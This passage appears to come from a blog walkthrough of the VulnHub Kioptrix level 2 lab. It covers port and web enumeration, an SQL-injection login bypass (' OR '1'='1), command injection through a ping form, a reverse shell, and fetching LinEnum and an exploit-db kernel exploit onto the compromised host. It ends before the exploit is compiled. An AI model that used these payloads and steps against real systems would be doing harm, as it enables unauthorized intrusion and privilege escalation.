|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
912/tcp  open  status   1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
3306/tcp open  mysql    MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 08:00:27:A0:57:DB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerating-ssh&quot;&gt;Enumerating SSH&lt;/h3&gt;

&lt;p&gt;Alright, so NMAP detected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenSSH 3.9p1 (protocol 1.99)&lt;/code&gt;, goolging this version number doesn’t reveal anything interesting, so let’s note it and move on.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-rpc&quot;&gt;Enumerating RPC&lt;/h3&gt;

&lt;p&gt;Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcinfo&lt;/code&gt; to see what kind of servies are being run through RPC, maybe some NFS shares are available?&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcinfo -p 10.0.0.35&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp    909  status
    100024    1   tcp    912  status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmmm… portmapper looks interesting. Let’s do some googling.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~~~time passes~~~&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Okay, so it looks like there are &lt;a href=&quot;https://gracefulsecurity.com/bypass-rpc-portmapper-filtering/&quot;&gt;cool tricks you can do&lt;/a&gt;, but it requires other services (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt;) to be running on the host. Most likely a dead end, but let’s note it and continue.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-httphttps&quot;&gt;Enumerating HTTP/HTTPS&lt;/h3&gt;

&lt;p&gt;I’ll start by running Nikto and ffuf on the web assets at port 80/443&lt;/p&gt;

&lt;h4 id=&quot;nikto&quot;&gt;Nikto&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nikto -host http://10.0.0.35&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nikto -host https://10.0.0.35&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let’s take a look at output from the HTTPS scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.0.35
+ Target Hostname:    10.0.0.35
+ Target Port:        443
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ SSL Info:        Subject:  /C&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;/ST&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeState/L&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeCity/O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganization/OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganizationalUnit/CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;localhost.localdomain/emailAddress&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root@localhost.localdomain
                   Ciphers:  DHE-RSA-AES256-SHA
                   Issuer:   /C&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;/ST&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeState/L&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeCity/O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganization/OU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganizationalUnit/CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;localhost.localdomain/emailAddress&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root@localhost.localdomain
+ Start Time:         2020-07-28 20:30:38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.0.52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ Hostname &lt;span class=&quot;s1&quot;&gt;'10.0.0.35'&lt;/span&gt; does not match certificate&lt;span class=&quot;s1&quot;&gt;'s names: localhost.localdomain
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header '&lt;/span&gt;tcn&lt;span class=&quot;s1&quot;&gt;' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8705 requests: 3 error(s) and 20 item(s) reported on remote host
+ End Time:           2020-07-28 20:42:10 (GMT-4) (692 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Intersting stuff, looks like an outdated version of Apache and some fun HTTP methods. Let’s note and come back to this.&lt;/p&gt;

&lt;h4 id=&quot;ffuf&quot;&gt;ffuf&lt;/h4&gt;

&lt;p&gt;I’ll move on to directory brute forcing using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;http&quot;&gt;HTTP:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.35/FUZZ`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;https&quot;&gt;HTTPS:&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.0.0.35/FUZZ`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Both results only gathered two directories &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manual&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usage&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;manual                  [Status: 301, Size: 309, Words: 20, Lines: 10]
usage                   [Status: 403, Size: 283, Words: 21, Lines: 11]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These look to be default Apache sub-directories… nothing really interesting. Oh well, let’s note and continue on.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-cups&quot;&gt;Enumerating CUPS&lt;/h3&gt;

&lt;p&gt;NMAP detected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CUPS 1.1&lt;/code&gt; on port 631 with some interesting HTTP headers. Weird. Let’s start by simply trying to access the service via HTTP with our web browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_1.PNG&quot; alt=&quot;Trying to access CUPS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ll be honest, I had to google CUPS to get an idea on what the service does… Let’s &lt;a href=&quot;https://en.wikipedia.org/wiki/CUPS&quot;&gt;see…&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Okay, cool! So CUPS is basically a Unix print service.&lt;/p&gt;

&lt;p class=&quot;box-note&quot;&gt;&lt;strong&gt;Note:&lt;/strong&gt; Hey! this is me from the future. Although I wasn’t aware at this time, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CUPS&lt;/code&gt; is really really useful, and may even come in handy for the OSCP. If you find it running, look into it.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-mysql&quot;&gt;Enumerating MySQL&lt;/h3&gt;

&lt;p&gt;NMAP scans for this one came back saying we are unauthorized, but let’s quickly confirm:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.35
ERROR 1130 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HY000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Host &lt;span class=&quot;s1&quot;&gt;'10.0.0.168'&lt;/span&gt; is not allowed to connect to this MySQL server
ein@~/VulnHub/Kioptrix1.1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.35
ERROR 1130 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HY000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Host &lt;span class=&quot;s1&quot;&gt;'10.0.0.168'&lt;/span&gt; is not allowed to connect to this MySQL server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yep, most likely need to come back to this one with credentials.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Let’s go back and start looking through scan results and seeing if there’s anything we missed. One thing that stuck out to me is the following Nikto results:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Huh, weird. Let’s take a look at those URLs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_2.PNG&quot; alt=&quot;Taking a look at the weird PHP URLs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Oh cool, so PHP leaks files out somehow via this vulnerability… Interesting, what else? Hmmm.. so it looks like NMAP picked up some weird HTTP headers, let’s use CURL to take a look at this “under the hood” without a web browser.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -X GET HTTP://10.0.0.35&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;frmLogin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;frmLogin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;300&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;center&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellpadding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellspacing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;colspan=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'center'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;Remote System Administration Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;150&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;uname&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;150&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;psw&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;colspan=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btnLogin&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Start of HTML when logged in as Administator --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Wait, what? This isn’t the default Apache page we found earlier. Skimming through the HTML, this looks like some sort of login page.&lt;/p&gt;

&lt;p&gt;Let’s add /index.php to the URL and see if we can access it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_3.PNG&quot; alt=&quot;Accessing index.php&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wow. Sure enough there’s a login page.&lt;/p&gt;

&lt;p&gt;At this point I’m not sure why this server was acting the way it was. For whatever reason though, accessing the page via a web browser just shot me over to the default Apache landing page.&lt;/p&gt;

&lt;p&gt;Anyways, now we have a login form. I tried some simple combinations like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; to no avail. Let’s try the most simple low hanging SQLi fruit of username: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' OR '1'='1&lt;/code&gt;. This is taken directly from the &lt;a href=&quot;https://en.wikipedia.org/wiki/SQL_injection#Incorrectly_filtered_escape_characters&quot;&gt;SQL Injection Wikipedia Page&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_4.PNG&quot; alt=&quot;SQL injection attempt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are successfully authenticated. Maybe we got a little lucky, but what does this give us?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_5.PNG&quot; alt=&quot;Admin Console&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmmm.. A stripped down admin console. It looks like it takes an arugment and executes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; command on the host.&lt;/p&gt;

&lt;p&gt;The fact that it likely uses PHP’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt; is interesting. I wonder if we can simply escape the query and execute code?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_6.PNG&quot; alt=&quot;Admin Console&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well that was easy… by simply prepending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; to our input, we can execute uer-defined code. Knowing this, it’s trivial to get a reverse shell using a &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;cheatsheet&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_7.PNG&quot; alt=&quot;Getting our reverse shell&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Time to enumerate. Let’s start by executing &lt;a href=&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;&gt;LinEnum&lt;/a&gt; to gather information about the host.&lt;/p&gt;

&lt;p&gt;I’ll download the script and host it on a local HTTP server using Python:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then on my compromised host:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;tmppp
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;tmppp
wget http://&amp;lt;my IP&amp;gt;/LinEnum.sh
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x LinEnum.sh
./LinEnum.sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; lol.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output’s a little messy, so let’s push &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lol.txt&lt;/code&gt; (the results) back to my Kali box using FTP.&lt;/p&gt;

&lt;p class=&quot;box-warning&quot;&gt;&lt;strong&gt;Note:&lt;/strong&gt; if you’re on a busy network with other people (i.e. HackTheBox networks) you’ll want to utilize an alternate method to transfer files. Since this is a home lab FTP is suitable.&lt;/p&gt;

&lt;h4 id=&quot;pushing-the-linenum-output-using-ftp&quot;&gt;Pushing the LinEnum output using FTP:&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp &amp;lt;my IP&amp;gt;
Name: ...
Password: ...
put lol.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After reviewing, the first thing I notice is the Kernel version:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linux kioptrix.level2 2.6.9-55.EL&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which is really old. Also it looks like we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt; installed on the box.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;which gcc
/bin/gcc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;….hmmmm…Let’s &lt;a href=&quot;https://www.exploit-db.com/exploits/9542&quot;&gt;google&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And there looks to be a suitable kernel exploit. Okay, let’s try it out.&lt;/p&gt;

&lt;p&gt;I’ll first download the exploit and rename it to a gcc-friendly &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.c&lt;/code&gt; file name:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1.1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://www.exploit-db.com/download/9542
&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;9542 exploit.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s migrate it to the compromised host using FTP again:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;get exploit.c
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: exploit.c remote: exploit.c
227 Entering Passive Mode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10,0,0,168,165,104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
150 Accepted data connection
226-File successfully transferred
226 0.000 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;measured here&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 29.97 Mbytes per second
2645 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.000125 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.1e+04 Kbytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
exit
&lt;/span&gt;221-Goodbye. You uploaded 32 and downloaded 3 kbytes.
221 Logout.
bash-3.00&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;exploit.c  LinEnum.sh  lol.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

